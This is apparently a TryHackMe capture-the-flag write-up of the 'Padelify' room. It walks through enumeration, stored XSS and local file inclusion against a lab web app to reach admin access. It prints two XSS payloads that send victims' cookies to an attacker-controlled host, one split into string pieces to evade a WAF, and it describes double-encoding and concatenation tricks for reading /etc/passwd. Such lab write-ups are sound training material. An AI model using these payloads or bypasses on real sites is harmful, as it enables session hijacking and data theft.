---
Title: "Padelify — TryHackMe Writeup"
Author: Cankun Wang
date: 2025-12-2
tags: [tryhackme, writeup]
---

#Task

You’ve signed up for the Padel Championship, but your rival keeps climbing the leaderboard. The admin panel controls match approvals and registrations. Can you crack the admin and rewrite the draw before the whistle?

Note: In case you want to start over or restart all services, visit `http://10.66.130.108/status.php`.

#Enumeration

We start with a normal nmap scan for all ports.

![image-20251202165705042](./assets/image-20251202165705042.png)

![image-20251202165825009](./assets/image-20251202165825009.png)

Nothing else there, we will do a more detailed enumeration later.

With dirsearch, we try to enumerate the target directories.

![image-20251202175018499](./assets/image-20251202175018499.png)

![image-20251202175028020](./assets/image-20251202175028020.png)

There are a lot here, I just screenshot part of them.

![image-20251202175044520](./assets/image-20251202175044520.png)

Let's first view the target website.

![image-20251202171328327](./assets/image-20251202171328327.png)

Let's register an account.

![image-20251202171347716](./assets/image-20251202171347716.png)

A moderator will view the request. 

Hmmm.... Is that mean may be we can inject the payload(eg. like a phishing website or something else?) in the register field?

Well, I tried a XSS command in the player field.

---

"><script>document.location='http://YOURIP:8000/?c='+document.cookie</script>



---

However, we trigger the WAF.

We need to find a way to bypass the WAF.

![image-20251202172220456](./assets/image-20251202172220456.png)

#Exploit

We start with detecting the WAF rules.

![image-20251202173517765](./assets/image-20251202173517765.png)

After some tries in Burp repeater, we find only 'document.cookie' will trigger WAF. However, simple 'document' or 'cookie' will not trigger WAF, which means maybe the WAF rule is making combination of the words and compare it. 

Let's avoid directly using docement.cookie, and using other words for a payload.

---

"><script>
a='docu'+'ment';
b='coo'+'kie';
c=window[a][b];
new Image().src='http://10.9.0.1:8000/?c='+encodeURIComponent(c);
</script>

---

We start a simple server.

![image-20251202173909048](./assets/image-20251202173909048.png)

Received. Let's check it.

![image-20251202174025029](./assets/image-20251202174025029.png)

We decode it.

![image-20251202174034994](./assets/image-20251202174034994.png)

We have the id.

![image-20251202174725070](./assets/image-20251202174725070.png)

With the dev tools, we paste the id here. 

We try to use this cookie to visit dashboard.php, however, we still being redirect to login.php, which means this cookie may not have enough right.

So this is not the correct path, let's go back to the logs.

In dirsearch results, we noticed there are logs exist.

![image-20251202180017303](./assets/image-20251202180017303.png)

We have quite valuable info.

The path var/www/html.......

We can try this.

![image-20251202180546390](./assets/image-20251202180546390.png)

We are blocked. So we still need to find a way to bypass the WAF.

![image-20251202180732554](./assets/image-20251202180732554.png)

We tried the single encoded, and it is decoded by the WAF and blocked. Except one.

![image-20251202181153648](./assets/image-20251202181153648.png)

I remembered in error logs, it says double encoded may observed, which means double encoded may work.

![image-20251202180852005](./assets/image-20251202180852005.png)

We are partly correct, WAF only docode for once. However, it is still blocked.

We tried the path traversal. And one is kind of work.

![image-20251202181258698](./assets/image-20251202181258698.png)



I come back and think for a minute. XSS is definitely  exist, maybe I made something mistakes here?

I go back and retry the XSS.

![image-20251202183803956](./assets/image-20251202183803956.png)

![image-20251202183816972](./assets/image-20251202183816972.png)

This time I success. I think I may made a silly mistake, I forgot to refresh it.

Nevermind, keep going.

#Escalation privilege

![image-20251202184016137](./assets/image-20251202184016137.png)

There is a live.php. I noticed in url there is a 'page=....'

![image-20251202185339525](./assets/image-20251202185339525.png)



We make sure there is a LFI path, but it may be blocked by WAF for some files.

We remember the error logs file we read, let's try this.

![image-20251202185533935](./assets/image-20251202185533935.png)

We are sure it is blocked.

Let's try to bypass this.

Remember the WAF only do one decode, so we try the double encoded.

However, we find once the url appear 'etc/passwd' or 'config/app.config', it will be blocked, which means WAF is based on string combination matching. Same with what we thought in XSS part.

Remember what we did in XSS part? We split the word and use string concatenation to bypass it.

![image-20251202191449500](./assets/image-20251202191449500.png)

Here, we success. Now we have the admin credential.

![image-20251202192028994](./assets/image-20251202192028994.png)

We are in.

Thanks for reading!